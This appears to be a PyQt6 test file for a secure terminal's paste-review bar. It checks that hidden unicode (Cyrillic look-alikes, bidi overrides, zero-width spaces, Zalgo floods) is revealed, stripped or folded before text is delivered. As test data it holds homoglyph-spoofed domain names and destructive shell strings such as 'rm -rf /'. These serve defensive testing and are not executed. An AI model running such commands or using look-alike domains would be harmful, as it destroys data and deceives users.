#!/usr/bin/python3 -Bsu
## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

## Tests for secure_terminal.review (the in-window review bar) and
## secure_terminal.revealed_editor (the editable, revealed box it hosts). Built and
## driven offscreen. Covers: the ONE editable box that IS the exact preview of what
## crosses; the four actions (Strip unicode / ASCII-fold / Restore original / Deliver)
## plus Reject; the live per-class breakdown recomputed from the box on every change;
## the anti-fat-finger countdown gating Deliver for a paste (none for a copy); that a
## delivery re-sanitizes the box + un-reviewed tail and dispatches to the tab that held
## the text; the copy + clipboard direction relabels; and the widget's atomic-token
## editing / caret / click-snap. PyQt6 is REQUIRED: it fails loud (exit 1), never a
## silent skip, when the dependency is unavailable.

import os
import sys

os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')

try:
    from PyQt6.QtWidgets import QApplication, QWidget, QMessageBox
    from PyQt6.QtGui import QKeyEvent, QMouseEvent, QTextCursor, QGuiApplication
    from PyQt6.QtCore import Qt, QEvent, QMimeData, QPointF
    from secure_terminal.review import ReviewBar
    from secure_terminal.revealed_editor import RevealedEditor
except Exception as exc:  # fail closed: a required dependency must not silently skip
    sys.stderr.write('secure-terminal-tests: FAIL missing dependency: %s\n' % exc)
    sys.exit(1)

import secure_terminal.review as _rev                                          # noqa: E402

APP = QApplication.instance() or QApplication([])

_failures = 0


def ok(cond, msg):
    global _failures
    if cond:
        print('ok   %s' % msg)
    else:
        _failures += 1
        print('FAIL: %s' % msg)


def eq(got, want, msg):
    ok(got == want, '%s (got %r, want %r)' % (msg, got, want))


def key_ev(key, mods=Qt.KeyboardModifier.NoModifier, text=''):
    return QKeyEvent(QEvent.Type.KeyPress, key, mods, text)


CYR_A = chr(0x0430)      # CYRILLIC SMALL LETTER A -- a look-alike of 'a'
RTL = chr(0x202E)        # RIGHT-TO-LEFT OVERRIDE -- a bidi control (invisible)
ZWSP = chr(0x200B)       # ZERO WIDTH SPACE -- an invisible
E_ACUTE = chr(0x00E9)    # e-acute: honest foreign non-ASCII (nonascii class, no band)


class _FakeTerm:
    """Stand-in for the tab that held the text: the bar reads its theme, mode, font
    and zoom (the box follows them) and dispatches the choice back to it."""
    def __init__(self):
        self._theme = 'dark'
        self._mode = 'detail'
        self._markings = True
        self.dispatched = []
        self.last_text = None

    def current_font_family(self):
        return 'Hack'

    def current_mode(self):
        return self._mode

    def current_zoom(self):
        return 100

    def _bracketed_paste_active(self):
        return False

    def dispatch_pending_paste(self, action, text=None):
        self.dispatched.append(('paste', action))
        self.last_text = text

    def dispatch_pending_copy(self, action, text=None):
        self.dispatched.append(('copy', action))
        self.last_text = text


class _FakeClip:
    """The clipboard holder ReviewBar dispatches to -- NOT a terminal: it exposes
    only _theme (no current_mode / font / zoom), so the bar's follow-the-tab guards
    take their has-not branch."""
    def __init__(self):
        self._theme = 'light'
        self.dispatched = []
        self.last_text = None

    def dispatch_pending_clipboard(self, action, text=None):
        self.dispatched.append(('clipboard', action))
        self.last_text = text


_win = QWidget()
_bar = ReviewBar(_win)


# ======================================================================
# RevealedEditor -- the widget, in isolation
# ======================================================================
_ed = RevealedEditor()

# set_source: keep printable look-alikes, drop invisibles, preserve newlines
_ed.set_source('ex' + CYR_A + 'mple' + ZWSP + '.com\nsecond')
eq(_ed.source(), 'ex' + CYR_A + 'mple.com\nsecond',
   'set_source drops the invisible, keeps the look-alike + newline')
eq(_ed._pos, len(_ed.source()), 'caret opens at the end of the box')
_doc = _ed.toPlainText()
ok('\n' in _doc, 'the box renders multi-line')
ok('CYRILLIC' in _doc, 'the look-alike is revealed as a detail badge')

# atomic-token Backspace: one Del removes the whole source char + its badge
_idx = _ed.source().index(CYR_A) + 1
_ed._pos = _idx
_ed.keyPressEvent(key_ev(Qt.Key.Key_Backspace))
eq(_ed.source(), 'exmple.com\nsecond', 'one Backspace removes the whole look-alike source char')
ok('CYRILLIC' not in _ed.toPlainText(), 'the badge is gone after a single Backspace (atomic token)')
# Backspace at index 0 is a no-op
_ed._pos = 0
_ed.keyPressEvent(key_ev(Qt.Key.Key_Backspace))
eq(_ed.source(), 'exmple.com\nsecond', 'Backspace at the start is a no-op')
# Delete mid-buffer removes the char AFTER the caret; Delete at the end is a no-op
_ed.set_source('abc')
_ed._pos = 1
_ed.keyPressEvent(key_ev(Qt.Key.Key_Delete))
eq(_ed.source(), 'ac', 'Delete removes the char after the caret')
_ed._pos = len(_ed.source())
_ed.keyPressEvent(key_ev(Qt.Key.Key_Delete))
eq(_ed.source(), 'ac', 'Delete at the end is a no-op')

# typing inserts source cells; a typed invisible is dropped; Enter makes a newline
_ed.set_source('cat')
_ed._pos = 3
_ed.keyPressEvent(key_ev(Qt.Key.Key_Space, text=' '))
_ed.keyPressEvent(key_ev(Qt.Key.Key_X, text='x'))
eq(_ed.source(), 'cat x', 'typing inserts source characters')
_ed.keyPressEvent(key_ev(0, text=ZWSP))       # a typed invisible sanitizes to '' -> no-op insert
eq(_ed.source(), 'cat x', 'a typed invisible is dropped on insert (empty chunk)')
_ed.keyPressEvent(key_ev(Qt.Key.Key_Return))
_ed.keyPressEvent(key_ev(Qt.Key.Key_B, text='b'))
eq(_ed.source(), 'cat x\nb', 'Enter inserts a newline; the next char lands on line 2')

# navigation: Left/Right (with the no-op edges), Home/End
_ed.set_source('hello\nworld')
_ed._pos = 0
_ed.keyPressEvent(key_ev(Qt.Key.Key_Left))
eq(_ed._pos, 0, 'Left at the start is a no-op')
_ed._pos = len(_ed.source())
_ed.keyPressEvent(key_ev(Qt.Key.Key_Right))
eq(_ed._pos, len(_ed.source()), 'Right at the end is a no-op')
_ed._pos = 2
_ed.keyPressEvent(key_ev(Qt.Key.Key_Right))
eq(_ed._pos, 3, 'Right advances one source char')
_ed.keyPressEvent(key_ev(Qt.Key.Key_Left))
eq(_ed._pos, 2, 'Left retreats one source char')
_ed._pos = len(_ed.source())              # end of 'world'
_ed.keyPressEvent(key_ev(Qt.Key.Key_Home))
eq(_ed._pos, 6, 'Home moves to the start of the current line')
_ed.keyPressEvent(key_ev(Qt.Key.Key_End))
eq(_ed._pos, 11, 'End moves to the end of the current line')

# vertical motion, keeping the column, with clamps + edges
_ed.set_source('abcdef\ngh')
_ed._pos = 4                              # 'e' on line 1
_ed.keyPressEvent(key_ev(Qt.Key.Key_Down))
eq(_ed._pos, 9, 'Down clamps the column to the shorter target line (end of gh)')
_ed.keyPressEvent(key_ev(Qt.Key.Key_Down))
eq(_ed._pos, len(_ed.source()), 'Down on the last line goes to the very end')
_ed._pos = 8                              # 'h' on line 2 (col 1)
_ed.keyPressEvent(key_ev(Qt.Key.Key_Up))
eq(_ed._pos, 1, 'Up keeps the column onto the previous line')
_ed._pos = 2                              # line 1 -> Up with no previous line
_ed.keyPressEvent(key_ev(Qt.Key.Key_Up))
eq(_ed._pos, 0, 'Up on the first line goes to the very start')
# Down into a LONGER next line keeps the column exactly (no clamp)
_ed.set_source('ab\ncdef')
_ed._pos = 2                              # end of line 1 (col 2)
_ed.keyPressEvent(key_ev(Qt.Key.Key_Down))
eq(_ed._pos, 5, 'Down into a longer line keeps the column (index 5)')

# the read-only Ctrl chords (select-all, copy) fall through to the base without mutating
_CTRL = Qt.KeyboardModifier.ControlModifier
_ed.set_source('abc')
_ed._pos = 1
_ed.keyPressEvent(key_ev(Qt.Key.Key_C, mods=_CTRL, text='\x03'))
eq(_ed.source(), 'abc', 'Ctrl+C (copy) does not mutate the box')
_ed.keyPressEvent(key_ev(Qt.Key.Key_Insert, mods=_CTRL))
eq(_ed.source(), 'abc', 'Ctrl+Insert (copy) does not mutate the box')
# an UNLISTED Ctrl chord is swallowed entirely (no base edit action can reach the doc)
_ed.keyPressEvent(key_ev(Qt.Key.Key_Z, mods=_CTRL, text='\x1a'))
eq(_ed.source(), 'abc', 'an unlisted Ctrl chord (Ctrl+Z) is swallowed, no mutation')
# a key with no text and no handler falls through to the base
_ed.keyPressEvent(key_ev(Qt.Key.Key_F5))
eq(_ed.source(), 'abc', 'an unhandled no-text key falls through with no change')
# Esc is ignored so it can bubble to the review bar
_esc = key_ev(Qt.Key.Key_Escape)
_ed.keyPressEvent(_esc)
ok(not _esc.isAccepted(), 'the editor ignores Esc so it bubbles to the review bar')

# --- CRIT1 REGRESSION: source() must equal what the box VISIBLY shows, across every
# base-editor mutation vector. self._text is the ONLY authority (source()/Deliver read
# it); a base op that edits the rendered document without routing through _text desyncs
# it, so Deliver would cross STALE text. Each vector below FAILS on the pre-fix code
# (which passed Ctrl chords to super() and had no selection model): the base mutates the
# doc, source() stays the original.
ok(_ed.contextMenuPolicy() == Qt.ContextMenuPolicy.NoContextMenu,
   'the context menu is disabled (its Cut/Paste/Delete cannot edit the doc)')
ok(not _ed.acceptDrops(), 'drops are disabled (no drag-drop edit behind the model)')


def _select_src(ed, a, b):
    """Set the base cursor's selection over SOURCE range [a, b), via doc offsets --
    the same selection a mouse drag or Ctrl+A leaves for the edit ops to act on."""
    cur = ed.textCursor()
    cur.setPosition(ed._offset(a))
    cur.setPosition(ed._offset(b), QTextCursor.MoveMode.KeepAnchor)
    ed.setTextCursor(cur)


# Ctrl+A then Ctrl+X: the whole box is cut THROUGH THE MODEL, not just the visible doc
_ed.set_source('helloEVILworld')
_ed.keyPressEvent(key_ev(Qt.Key.Key_A, mods=_CTRL, text='\x01'))
_ed.keyPressEvent(key_ev(Qt.Key.Key_X, mods=_CTRL, text='\x18'))
eq(_ed.source(), '', 'Ctrl+A + Ctrl+X empties source() (no desync)')
# Ctrl+X on a mid selection removes exactly that source span
_ed.set_source('helloEVILworld')
_select_src(_ed, 5, 9)
_ed.keyPressEvent(key_ev(Qt.Key.Key_X, mods=_CTRL, text='\x18'))
eq(_ed.source(), 'helloworld', 'Ctrl+X removes exactly the selected span from source()')
# Ctrl+X does NOT write the (unreviewed) box text to the OS clipboard -- no exfil
_board = QGuiApplication.clipboard()
_board.setText('SENTINEL')
_ed.set_source('secretEVIL')
_select_src(_ed, 6, 10)
_ed.keyPressEvent(key_ev(Qt.Key.Key_X, mods=_CTRL, text='\x18'))
eq(_board.text(), 'SENTINEL', 'Ctrl+X writes nothing to the clipboard (no exfil of unreviewed text)')
# Ctrl+X with NO selection is a no-op (does not cut the line)
_ed.set_source('keep me')
_ed._pos = 3
_ed.keyPressEvent(key_ev(Qt.Key.Key_X, mods=_CTRL, text='\x18'))
eq(_ed.source(), 'keep me', 'Ctrl+X with no selection is a no-op')
# type-over-selection replaces the selection in source()
_ed.set_source('helloEVILworld')
_select_src(_ed, 5, 9)
_ed.keyPressEvent(key_ev(Qt.Key.Key_Z, text='Z'))
eq(_ed.source(), 'helloZworld', 'typing over a selection replaces it (no leftover hostile text)')
# typing a DROPPED invisible over a selection still deletes the selection
_ed.set_source('helloEVILworld')
_select_src(_ed, 5, 9)
_ed.keyPressEvent(key_ev(0, text=ZWSP))
eq(_ed.source(), 'helloworld', 'typing a dropped invisible over a selection deletes it')
# Ctrl+V paste over a selection replaces it, re-sanitized
_ed.set_source('helloEVILworld')
_select_src(_ed, 5, 9)
QGuiApplication.clipboard().setText('X' + ZWSP + 'Y')
_ed.keyPressEvent(key_ev(Qt.Key.Key_V, mods=_CTRL, text='\x16'))
eq(_ed.source(), 'helloXYworld', 'Ctrl+V replaces the selection with sanitized clipboard text')
# Backspace / Delete with a selection delete the whole selection (not one char)
_ed.set_source('helloEVILworld')
_select_src(_ed, 5, 9)
_ed.keyPressEvent(key_ev(Qt.Key.Key_Backspace))
eq(_ed.source(), 'helloworld', 'Backspace with a selection deletes the whole selection')
_ed.set_source('helloEVILworld')
_select_src(_ed, 5, 9)
_ed.keyPressEvent(key_ev(Qt.Key.Key_Delete))
eq(_ed.source(), 'helloworld', 'Delete with a selection deletes the whole selection')
# Ctrl+Backspace / Ctrl+Delete: word-delete through the model (no base word-delete)
_ed.set_source('rm -rf secret')
_ed._pos = len(_ed.source())
_ed.keyPressEvent(key_ev(Qt.Key.Key_Backspace, mods=_CTRL, text='\x08'))
eq(_ed.source(), 'rm -rf ', 'Ctrl+Backspace deletes the previous word through the model')
_ed.set_source('rm -rf secret')
_ed._pos = 0
_ed.keyPressEvent(key_ev(Qt.Key.Key_Delete, mods=_CTRL, text='\x7f'))
eq(_ed.source(), ' -rf secret', 'Ctrl+Delete deletes the next word through the model')
# word-delete from ON whitespace skips the run of spaces first (both directions)
_ed.set_source('ls  file')
_ed._pos = 2                                  # on the run of spaces
_ed.keyPressEvent(key_ev(Qt.Key.Key_Delete, mods=_CTRL, text='\x7f'))
eq(_ed.source(), 'ls', 'Ctrl+Delete from on spaces skips them, then deletes the next word')
_ed.set_source('file  ')
_ed._pos = 6                                  # after the trailing spaces
_ed.keyPressEvent(key_ev(Qt.Key.Key_Backspace, mods=_CTRL, text='\x08'))
eq(_ed.source(), '', 'Ctrl+Backspace from after trailing spaces skips them, then deletes the word')
# Ctrl+word-delete with a selection deletes the selection instead
_ed.set_source('helloEVILworld')
_select_src(_ed, 5, 9)
_ed.keyPressEvent(key_ev(Qt.Key.Key_Backspace, mods=_CTRL, text='\x08'))
eq(_ed.source(), 'helloworld', 'Ctrl+Backspace with a selection deletes the selection')
# a mouse press collapses any selection BEFORE the base sees it (no drag-move source)
_ed.set_source('abc')
_select_src(_ed, 0, 3)
ok(_ed.textCursor().hasSelection(), 'precondition: a selection is set')
_ed.mousePressEvent(QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(0.0, 0.0),
                                Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                                Qt.KeyboardModifier.NoModifier))
ok(not _ed.textCursor().hasSelection(),
   'a mouse press collapses the selection first (a drag-move cannot start)')

# paste INTO the box is re-sanitized; a None mime source inserts nothing
_ed.set_source('a')
_ed._pos = 1
_m = QMimeData()
_m.setText('X' + ZWSP + CYR_A)            # invisible dropped, look-alike kept
_ed.insertFromMimeData(_m)
eq(_ed.source(), 'aX' + CYR_A, 'a paste into the box drops the invisible, keeps the look-alike')
_ed.insertFromMimeData(None)
eq(_ed.source(), 'aX' + CYR_A, 'a None mime source inserts nothing')

# appearance follow: theme (known + unknown), mode (known + unknown), font, zoom
_ed.apply_theme('light')
eq(_ed._theme, 'light', 'apply_theme sets a known theme')
_ed.apply_theme('bogus')
eq(_ed._theme, 'light', 'apply_theme falls back to light for an unknown theme')
_ed.set_mode('show')
eq(_ed._mode, 'show', 'set_mode sets a known mode')
_ed.set_mode('bogus')
eq(_ed._mode, 'detail', 'set_mode falls back to detail for an unknown mode')
_ed.set_font_family('')
eq(_ed._font_family, 'Hack', 'set_font_family falls back to the default for an empty name')
_ed.set_font_family('DejaVu Sans Mono')
eq(_ed._font_family, 'DejaVu Sans Mono', 'set_font_family follows the tab family')
_ed.apply_zoom(150)
eq(_ed._zoom, 150, 'apply_zoom follows the tab zoom')
_ed.apply_zoom('not-an-int')
eq(_ed._zoom, 150, 'apply_zoom ignores a non-integer value (keeps the current zoom)')

# _format tint: a look-alike wears a banded risk class (confusable, bg set); honest
# foreign wears a fg-only tint (nonascii, bg None); plain ASCII is uncoloured. Rendering
# a box with all three (detail mode) exercises every _format branch.
_ed.set_mode('detail')
_ed.apply_theme('dark')
_ed.set_source('a' + CYR_A + E_ACUTE)
ok('CYRILLIC' in _ed.toPlainText() and 'ACUTE' in _ed.toPlainText(),
   'the box detail-renders a look-alike and honest-foreign badge (exercises the tints)')

# click-snap: an offset inside a wide badge snaps to a source-cell boundary
_ed.set_source('a' + CYR_A + 'b')
_a1 = _ed._offset(1)
_a2 = _ed._offset(2)
ok((_a2 - _a1) > 1, 'the look-alike badge occupies multiple columns')
_snap = _ed._source_index_for_doc_pos(_a1 + 1)
ok(_snap in (1, 2), 'a click inside the badge snaps to a cell boundary (got %d)' % _snap)
eq(_ed._source_index_for_doc_pos(0), 0, 'a click at column 0 snaps to source index 0')
eq(_ed._source_index_for_doc_pos(_a2), 2, 'a click at a boundary snaps exactly to it')
# drive mousePressEvent itself (covers the snap + re-render wiring)
_mev = QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(0.0, 0.0),
                   Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                   Qt.KeyboardModifier.NoModifier)
_ed.mousePressEvent(_mev)
ok(0 <= _ed._pos <= len(_ed.source()), 'a mouse press places the caret at a valid source index')

# --- CRIT1 REGRESSION: the doc<->source mapping must be MONOTONIC + select exactly the
# VISIBLE characters, in ALL display modes. In 'show' a >8 combining-mark (Zalgo) run
# collapses to ONE box glyph; the old prefix-render _offset then went NON-monotonic
# across the cluster (a prefix cutting it showed the partial marks as separate cells),
# so the binary search returned mid-cluster indices and a selection after the cluster
# deleted the WRONG (invisible) bytes while the visible chars still delivered. FAILS on
# the pre-fix code in 'show'.
_ACUTE = chr(0x0301)                                   # combining acute
_DISPLAY_MODES = ('box', 'show', 'reveal', 'detail')


def _select_doc(ed, a, b):
    cur = ed.textCursor()
    cur.setPosition(ed._offset(a))
    cur.setPosition(ed._offset(b), QTextCursor.MoveMode.KeepAnchor)
    ed.setTextCursor(cur)


for _mode in _DISPLAY_MODES:
    _ze = RevealedEditor()
    _ze.set_mode(_mode)
    _ze.set_source('a' + _ACUTE * 9 + 'XYZ')           # 9 marks: >8, collapses in 'show'
    _src = _ze.source()
    # _offset monotonic non-decreasing across every source index
    _offs = [_ze._offset(_i) for _i in range(len(_src) + 1)]
    ok(all(_offs[_i] <= _offs[_i + 1] for _i in range(len(_src))),
       '%s: _offset is monotonic across a collapsed Zalgo cluster' % _mode)
    # selecting the VISIBLE trailing "XYZ" and deleting removes exactly XYZ
    _x = _src.index('X')
    _select_doc(_ze, _x, _x + 3)
    _ze.keyPressEvent(key_ev(Qt.Key.Key_Delete))
    eq(_ze.source(), 'a' + _ACUTE * 9,
       '%s: deleting the visibly-selected XYZ removes exactly XYZ (right bytes)' % _mode)

# a >_COMBINING_RUN_MAX Zalgo flood is capped in the box source, so the source stays 1:1
# with the render cells (no stored-but-undrawn marks that would desync the mapping)
_flood = RevealedEditor()
_flood.set_source('a' + _ACUTE * 100 + 'b')
_run = _maxrun = 0
for _ch in _flood.source():
    if _ch == _ACUTE:
        _run += 1
        _maxrun = max(_maxrun, _run)
    else:
        _run = 0
ok(_maxrun <= 32, 'a Zalgo flood is capped at 32 marks/run in the box source (got %d)' % _maxrun)
# an insert that JOINS two sub-cap runs into an over-cap flood is re-capped
_join = RevealedEditor()
_join.set_source('a' + _ACUTE * 20)
_join._pos = len(_join.source())
_join_mime = QMimeData()
_join_mime.setText(_ACUTE * 20)
_join.insertFromMimeData(_join_mime)                   # 20 + 20 across the splice -> >32
_run = _maxrun = 0
for _ch in _join.source():
    if _ch == _ACUTE:
        _run += 1
        _maxrun = max(_maxrun, _run)
    else:
        _run = 0
ok(_maxrun <= 32, 'an insert joining two sub-cap runs is re-capped to 32 (got %d)' % _maxrun)
# a multi-line box: the mapping round-trips across the newline (covers the \n branch)
_ml = RevealedEditor()
_ml.set_source('ab\ncd')
ok(all(_ml._offset(_i) <= _ml._offset(_i + 1) for _i in range(len(_ml.source()))),
   'the mapping is monotonic across a newline')
eq(_ml._source_index_for_doc_pos(_ml._offset(4)), 4,
   'a doc offset on line 2 maps back to the right source index across the newline')


# ======================================================================
# ReviewBar -- the bar around the box
# ======================================================================

# --- show a paste review: keep-printable box, summary, table, countdown --------
_t = _FakeTerm()
_raw = 'pay' + CYR_A + 'l' + RTL + ZWSP + '\n'     # a look-alike + a bidi + an invisible
_bar.show_review(_t, _raw, 3, 'paste')
ok(_bar.reviewed_term() is _t, 'reviewed_term is the tab that held the paste')
eq(_bar._editor.source(), 'pay' + CYR_A + 'l\n',
   'the box opens keep-printable: the bidi + invisible are dropped, the look-alike kept')
ok('hides' in _bar._summary.text(), 'the summary names what the box hides')
ok(_rev.RISK_FG in _bar._dot.styleSheet(), 'the risk dot is red while something is hidden')
ok('Keeping printable unicode' in _bar._status.text()
   and 'dropped' in _bar._status.text(),
   'the status line names the keep-printable transform + how much it dropped')
ok('Look-alike' in _bar._detail.text(), 'the breakdown lists the look-alike class')

# REGRESSION: the keep-printable status counts ALL drops the box makes -- including the
# editor's combining-run cap -- not just the invisibles. On a >32 Zalgo flood the old
# count (len - len(sanitize_clipboard_unicode), which KEEPS combining) read "0 dropped"
# while the box actually shrank ~968 chars, contradicting the same bar's hidden-char
# table. Counted against the ACTUAL box now.
_zt = _FakeTerm()
_bar.show_review(_zt, 'a' + _ACUTE * 100, 0, 'paste')      # 100 marks -> box caps at 32
_zexpect = len('a' + _ACUTE * 100) - len(_bar._editor.source())
ok(_zexpect > 60, 'precondition: the flood really shrank the box (dropped %d)' % _zexpect)
ok('0 hidden characters dropped' not in _bar._status.text()
   and ('%d hidden' % _zexpect) in _bar._status.text(),
   'a >32-combining flood reports the REAL dropped count, not 0: %r' % _bar._status.text())
# Restore reports the same real count (same path)
_bar._do_strip()                                           # move off keep first
_saved_zq = QMessageBox.question
QMessageBox.question = staticmethod(lambda *a, **k: QMessageBox.StandardButton.Yes)
try:
    _bar._do_restore()
finally:
    QMessageBox.question = _saved_zq
ok(('%d hidden' % _zexpect) in _bar._status.text(),
   'Restore reports the same real dropped count for the flood')
_bar.show_review(_t, _raw, 3, 'paste')                     # restore the state the following tests assume
ok(not _bar._deliver.isEnabled() and '(3)' in _bar._deliver.text(),
   'Deliver is countdown-gated for a paste and shows the remaining seconds')

# --- [Strip unicode]: delete non-ASCII, NO mapping -> all-clear ---------------
_bar._do_strip()
eq(_bar._editor.source(), 'payl\n', 'Strip deletes the look-alike (no mapping)')
ok('ASCII only' in _bar._status.text() and 'removed' in _bar._status.text(),
   'the status line names the strip')
ok(_rev.SAFE_FG in _bar._dot.styleSheet(), 'the dot turns safe-green once the box is clean')
eq(_bar._summary.text(), _rev._CLEAN_MSG, 'the summary shows the all-clear after a strip')
ok('(none)' in _bar._detail.text(), 'the breakdown shows no hidden characters after a strip')

# --- [ASCII-fold]: map the look-alike to the ASCII it imitates ----------------
_bar.show_review(_t, 'ex' + CYR_A + 'mple.com', 3, 'paste')
_bar._do_fold()
eq(_bar._editor.source(), 'example.com', 'ASCII-fold maps the Cyrillic look-alike to a plain a')
ok('Folded look-alikes' in _bar._status.text(), 'the status line names the fold')

# --- [Restore original paste]: No cancels, Yes reverts ------------------------
_bar.show_review(_t, 'ex' + CYR_A + 'mple.com', 3, 'paste')
_bar._do_strip()                                   # box now 'exmple.com'
_saved_q = QMessageBox.question
QMessageBox.question = staticmethod(lambda *a, **k: QMessageBox.StandardButton.No)
try:
    _bar._do_restore()
finally:
    QMessageBox.question = _saved_q
eq(_bar._editor.source(), 'exmple.com', 'Restore with No keeps the edited box')
QMessageBox.question = staticmethod(lambda *a, **k: QMessageBox.StandardButton.Yes)
try:
    _bar._do_restore()
finally:
    QMessageBox.question = _saved_q
eq(_bar._editor.source(), 'ex' + CYR_A + 'mple.com',
   'Restore with Yes reverts the box to the keep-printable original')
ok('Keeping printable unicode' in _bar._status.text(), 'Restore relabels the status to keep')
# Restore is a no-op once the review is resolved (no _term)
_bar._choose('reject')
_bar._do_restore()
ok(_bar.reviewed_term() is None, 'Restore is a no-op with no review open')

# --- Deliver dispatches the box via the unicode action, exactly once ----------
_t2 = _FakeTerm()
_bar.show_review(_t2, 'ex' + CYR_A + 'mple.com', 3, 'paste')
_bar._do_strip()                                   # box -> 'exmple.com'
ok(not _bar._deliver.isEnabled(), 'Deliver is re-gated after a transform (countdown re-armed)')
_bar._deliver_clicked()
eq(_t2.dispatched, [], 'a Deliver click during the countdown is a gated no-op')
_bar._tick(); _bar._tick(); _bar._tick()           # elapse the 3s countdown
ok(_bar._deliver.isEnabled() and _bar._deliver.text() == 'Paste',
   'Deliver enables once the countdown elapses (the suffix is dropped)')
_bar._deliver_clicked()
eq(_t2.dispatched, [('paste', 'unicode')], 'Deliver dispatches the unicode action')
eq(_t2.last_text, 'exmple.com', 'Deliver sends exactly the box buffer')
ok(_bar.reviewed_term() is None, 'delivery resolves + hides the bar')
_bar._deliver_clicked()
eq(_t2.dispatched, [('paste', 'unicode')], 'a second Deliver after resolution is a no-op')

# --- a manual edit re-runs the classifier AND re-arms the countdown -----------
_t3 = _FakeTerm()
_bar.show_review(_t3, _raw, 2, 'paste')
_bar._tick(); _bar._tick(); _bar._tick()           # elapse -> Deliver enabled
ok(_bar._deliver.isEnabled(), 'Deliver enables after the countdown elapses')
_bar._editor.set_source('rm -rf /' + CYR_A)        # replace the box content
ok(not _bar._deliver.isEnabled() and _bar._remaining > 0,
   'editing the box re-arms the countdown (Deliver disabled again for the new content)')
ok('hides' in _bar._summary.text(), 'the summary re-flags the edited-in look-alike')
_bar._choose('reject')

# --- Esc rejects from anywhere; a non-Esc key on the bar dispatches nothing ----
_t4 = _FakeTerm()
_bar.show_review(_t4, _raw, 0, 'paste')
_bar.keyPressEvent(key_ev(Qt.Key.Key_Escape))
eq(_t4.dispatched, [('paste', 'reject')], 'Esc rejects the held paste')
_t5 = _FakeTerm()
_bar.show_review(_t5, _raw, 0, 'paste')
_bar.keyPressEvent(key_ev(Qt.Key.Key_Y, text='y'))
eq(_t5.dispatched, [], 'a non-Esc key on the bar dispatches nothing')
_bar._choose('reject')

# --- copy direction: no countdown, relabels, dispatch to the copy path --------
_tc = _FakeTerm()
_bar.show_review(_tc, 'foo' + CYR_A + 'bar', 0, 'copy')
eq(_bar._reject.text(), "Don't copy", 'copy review: Reject becomes "Don\'t copy"')
eq(_bar._deliver.text(), 'Copy', 'copy review: Deliver is labelled Copy')
ok('copy' in _bar._summary.text().lower(), 'copy review: the summary is phrased for the copy')
ok(_bar._deliver.isEnabled(), 'copy review: Deliver is enabled at once (no countdown)')
_bar._deliver_clicked()
eq(_tc.dispatched, [('copy', 'unicode')], 'copy review dispatches to the copy path')
eq(_tc.last_text, 'foo' + CYR_A + 'bar', 'copy delivers the box buffer')

# --- clipboard direction: a holder without mode/font/zoom is themed by _theme --
_cl = _FakeClip()
_bar.show_review(_cl, 'net' + CYR_A + 'flix.com', 0, 'clipboard')
eq(_bar._reject.text(), 'Leave it', 'clipboard review: Reject becomes "Leave it"')
eq(_bar._deliver.text(), 'Replace', 'clipboard review: Deliver is labelled Replace')
ok(_bar._editor.source() == 'net' + CYR_A + 'flix.com',
   'clipboard review: the box loads the keep-printable holder text')
_bar._deliver_clicked()
eq(_cl.dispatched, [('clipboard', 'unicode')], 'clipboard review dispatches to the clipboard path')

# --- rerender_mirror follows a live tab change; no-op once resolved -----------
_tm = _FakeTerm()
_bar.show_review(_tm, _raw, 0, 'paste')
_tm._mode = 'show'
_bar.rerender_mirror()
eq(_bar._editor._mode, 'show', 'rerender_mirror follows the tab display mode live')
_bar._choose('reject')
_bar.rerender_mirror()
ok(_bar.reviewed_term() is None, 'rerender_mirror is a no-op once the review is resolved')
# the appearance + refresh helpers also early-return on the cleared _term, so a late
# follow-call (a stray editor signal, a window refresh after resolution) is a safe no-op
_bar._sync_appearance()
_bar._refresh_review()
ok(_bar.reviewed_term() is None,
   'the appearance + refresh helpers no-op once the review is resolved (guarded on _term)')

# --- the breakdown: Structure + per-class table, multi-line + bracketed -------
_bar.show_review(_FakeTerm(), 'a' + chr(0x2500) + chr(0x2502) + E_ACUTE, 0, 'paste')
_d = _bar._detail.text()
ok('Structure' in _d and 'Hidden characters' in _d, 'the breakdown has both sections')
ok('Box-drawing / blocks' in _d, 'box-drawing gets its own low-risk row')
ok('Other non-ASCII' in _d, 'honest foreign is its own row')
ok('If accepted' in _d and 'press Enter to run' in _d,
   'a paste shows the never-auto-run guarantee (waits for Enter, non-bracketed)')
ok(_bar._summary.textInteractionFlags() & Qt.TextInteractionFlag.TextSelectableByMouse,
   'the summary is selectable')
ok(_bar._detail.textInteractionFlags() & Qt.TextInteractionFlag.TextSelectableByMouse,
   'the breakdown is selectable')
# multi-line PASTE says it runs more than one command
_bar.show_review(_FakeTerm(), 'ls\necho hi\n', 0, 'paste')
ok('runs more than one command' in _bar._detail.text(),
   'a multi-line PASTE review says it runs more than one command')
eq(_bar._summary.text(), _rev._CLEAN_MSG, 'an ASCII-only multi-line paste is an all-clear')
# multi-line COPY / CLIPBOARD read (multi-line), never "runs more than one command"
_bar.show_review(_FakeTerm(), 'ls\necho hi\n', 0, 'copy')
ok('multi-line' in _bar._detail.text()
   and 'runs more than one command' not in _bar._detail.text(),
   'a multi-line COPY review reads (multi-line), not "runs more than one command"')
_bar.show_review(_FakeClip(), 'ls\necho hi\n', 0, 'clipboard')
ok('multi-line' in _bar._detail.text()
   and 'runs more than one command' not in _bar._detail.text(),
   'a multi-line CLIPBOARD review reads (multi-line)')
# a bracketed-paste target states the program buffers it as text
_bt = _FakeTerm()
_bt._bracketed_paste_active = lambda: True         # type: ignore[method-assign]
_bar.show_review(_bt, _raw, 0, 'paste')
ok('your program receives it as text' in _bar._detail.text(),
   'a bracketed-paste target shows the program-receives-it-as-text guarantee')
_bar._choose('reject')

# --- a paste longer than the box cap: the tail is disclosed + still delivers ---
_big = 'a' * (_rev._BOX_MAX) + CYR_A + 'z'          # tail = CYR_A + 'z' past the cap
_tt = _FakeTerm()
_bar.show_review(_tt, _big, 3, 'paste')
eq(_bar._editor.source(), 'a' * _rev._BOX_MAX, 'the box loads only the first _BOX_MAX chars')
ok('truncated' in _bar._summary.text() and 'still delivers' in _bar._summary.text(),
   'a beyond-cap paste discloses the un-reviewed tail in the summary')
ok('+' in _bar._detail.text() and 'shown box' in _bar._detail.text(),
   'the breakdown marks the counts + length as of the shown box, not a definite total')
ok(_rev.RISK_FG in _bar._dot.styleSheet(),
   'a truncated review keeps the risk dot red (the tail is unverified)')
